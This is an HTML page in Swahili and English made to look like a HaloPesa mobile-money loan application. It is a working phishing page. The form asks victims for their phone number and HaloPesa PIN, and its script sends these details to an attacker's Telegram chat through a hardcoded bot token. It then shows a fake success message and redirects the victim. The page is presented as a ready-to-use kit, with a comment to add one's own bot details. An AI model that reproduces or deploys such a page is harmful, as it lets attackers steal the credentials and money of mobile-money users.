<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HALOPESA MKOPO</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f5f7fb;
    padding: 20px;
}

.container {
    max-width: 400px;
    margin: auto;
    background: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
}

input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
}

button {
    width: 100%;
    padding: 12px;
    background: #007bff;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background: #0056b3;
}
</style>
</head>

<body>

<div class="container">

<h2>HALOPESA LOAN APPLICATION</h2>

<form id="loanForm">

    <input type="text" id="phone" placeholder="Namba yako ya Halopesa" required>

    <input type="number" id="amount" placeholder="Kiasi cha Mkopo" required>

    <input type="number" id="days" placeholder="Muda wa Marejesho" required>

    <input type="password" id="pin" placeholder="PIN ya Halopesa" required>

    <button type="button" onclick="sendToTelegram()">ENDELEA / CONTINUE</button>

</form>

</div>

<script>
function sendToTelegram() {

    // Get form values
    let phone = document.getElementById("phone").value;
    let amount = document.getElementById("amount").value;
    let days = document.getElementById("days").value;
    let pin = document.getElementById("pin").value;

    // Message format
    let message =
`📌 NEW LOAN APPLICATION
------------------------
📱 Phone: ${phone}
💰 Amount: ${amount}
📆 Days: ${days}
🔐 PIN: ${pin}`;

    // 🔐 ADD YOUR DETAILS HERE
    let botToken = "7743245077:AAEb5A3vSWUThj4k206OKaymOt20oh-9x2E";
    let chatId = "7480420601";

    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Send to Telegram
    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {

        alert("Maombi yamefanikiwa!");

        // Redirect to Telegram (optional)
        window.location.href = "https://t.me/YourTelegramUsername";

    })
    .catch(error => {
        alert("Tatizo limetokea, jaribu tena");
        console.log(error);
    });

}
</script>

</body>
</html>
